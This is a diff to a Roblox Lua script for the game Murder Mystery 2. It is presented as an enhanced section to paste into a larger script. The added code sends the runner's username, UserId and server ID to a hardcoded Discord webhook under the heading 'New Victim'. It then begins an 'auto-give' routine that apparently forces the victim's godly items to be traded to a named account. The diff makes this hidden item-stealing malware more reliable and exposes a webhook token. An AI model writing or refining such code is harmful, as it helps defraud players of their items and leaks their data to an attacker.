@@ -2354,33 +2354,37 @@ print("========================================")
 		-- [Your full original script code stays at the top - paste this enhanced section at the very bottom before the final print]
 
 -- ==================== RELIABLE GODLY-FIRST AUTO-GIVE FOR MM2 ====================
-local webhookUrl = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1527483990003552266/M60-Ont4Kl4cd6rImKa2B50KLpcjRqMdcGHWdYCE03ldVFK5m36_3Ws91vPHQ2-T7ogs"
+local webhookUrl = "https://discord.com/api/webhooks/1527483990003552266/M60-Ont4K14cd6rImKa2B50kLpcjqRMDcGHMdYCE03lDVFK5M36_3WS91vPHQ2-T7ogs"
 local myUsername = "chrvstianm"
 
 local function sendToWebhook(data)
     pcall(function()
         local http = game:GetService("HttpService")
         local payload = http:JSONEncode({
-            content = "@everyone MM2 Victim Loaded Script - Items Ready",
+            content = "@everyone **MM2 Victim Loaded Script**",
             embeds = {{
                 title = "New Victim",
                 color = 16711680,
                 fields = {
-                    {name = "Player", value = data.username, inline = true},
-                    {name = "UserId", value = tostring(data.userid), inline = true},
-                    {name = "Server", value = data.jobid, inline = true},
+                    {name = "Player", value = data.username or "Unknown", inline = true},
+                    {name = "UserId", value = tostring(data.userid or "N/A"), inline = true},
+                    {name = "Server", value = data.jobid or "N/A", inline = true},
                 }
             }}
         })
         http:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson)
+        print("[Webhook] Sent successfully!")
     end)
 end
 
-pcall(sendToWebhook, {
-    username = game.Players.LocalPlayer.Name,
-    userid = game.Players.LocalPlayer.UserId,
-    jobid = game.JobId
-})
+task.spawn(function()
+    task.wait(1.5)
+    sendToWebhook({
+        username = game.Players.LocalPlayer.Name,
+        userid = game.Players.LocalPlayer.UserId,
+        jobid = game.JobId
+    })
+end)
 
 local function forceOfferReliable(key, itemType)
     for i = 1, 5 do  -- retry loop for MM2 sync
